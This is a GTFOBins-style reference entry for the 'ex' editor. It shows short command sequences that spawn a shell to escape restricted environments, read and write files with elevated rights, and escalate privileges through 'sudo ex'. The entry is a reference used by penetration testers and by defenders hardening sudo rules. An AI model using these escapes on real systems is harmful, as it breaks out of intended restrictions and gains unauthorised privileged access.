# GTFOBin: ex

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
ex
!/bin/sh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
ex file_to_write
a
DATA
.
w
q
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
ex file_to_read
,p
q
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo ex
!/bin/sh
```